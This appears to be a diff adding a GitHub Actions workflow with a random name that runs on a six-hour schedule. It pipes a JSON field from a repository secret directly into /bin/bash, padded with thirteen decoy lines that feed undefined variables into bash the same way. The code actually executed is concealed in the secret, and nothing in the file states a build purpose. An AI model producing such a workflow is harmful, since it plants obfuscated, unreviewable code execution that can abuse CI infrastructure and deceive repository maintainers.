@@ -1,0 +1,30 @@
+name: glisteningpartridges
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: glisteningpartridges
+        env:
+          g3: ${{ secrets.g3 }}
+        run: |
+          echo $g3 | jq -r .fsu2808 | /bin/bash
+          echo $dux13898 | jq -r .hfh74565 | /bin/bash
+          echo $pcwii698 | jq -r .qymj199 | /bin/bash
+          echo $yav70 | jq -r .hyblk7 | /bin/bash
+          echo $qw89 | jq -r .pxs3560 | /bin/bash
+          echo $owv0 | jq -r .yuu8 | /bin/bash
+          echo $mxyke33277 | jq -r .erqfr93070 | /bin/bash
+          echo $zto7404 | jq -r .grls1 | /bin/bash
+          echo $mfpjd37 | jq -r .f3930 | /bin/bash
+          echo $hqxv21 | jq -r .aoxk68 | /bin/bash
+          echo $vvgsp145 | jq -r .zuaw3 | /bin/bash
+          echo $xnghl30770 | jq -r .cu8677 | /bin/bash
+          echo $sv6159 | jq -r .pdyyh26987 | /bin/bash
+          echo $ntsl331 | jq -r .ptfb4604 | /bin/bash
+
